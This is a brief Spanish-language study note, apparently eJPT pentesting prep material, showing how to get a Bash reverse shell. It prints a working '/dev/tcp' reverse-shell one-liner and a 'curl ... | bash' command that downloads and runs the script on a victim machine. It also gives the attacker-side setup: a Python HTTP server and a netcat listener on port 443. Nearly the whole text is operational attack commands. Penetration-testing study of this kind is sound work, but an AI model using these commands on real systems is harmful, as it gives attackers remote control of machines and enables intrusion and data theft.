```
#!/bin/bash

bash -i >& /dev/tcp/192.168.0.32/443 0>&1
```
![Reverse Shell en Bash](ejpt/img/reverse-shell-en-bash.png)
- **192.168.0.32**: La IP del atacante.
- **443**: El puerto por el que recibes la **Reverse Shell**.

1. Para ejecutar la **Reverse Shell** en la maquina victima hay que descargarse la **Reverse Shell** en la maquina victima y ejecutarla ahí con el siguiente comando:
```
curl http://192.168.0.32/reverse_shell.sh | bash
```
- La maquina atacante tiene que tener un servidor **HTTP** abierto (**python3 -m http.server 80**) antes de que la victima ejecute el comando **curl** o se descargue o ejecute la **Reverse Shell**.
- El atacante tiene que tener el puerto 443 en escucha (**sudo nc -nlvp 443**) antes de que la victima ejecute el comando **curl** o se descargue y ejecute la **Reverse Shell**.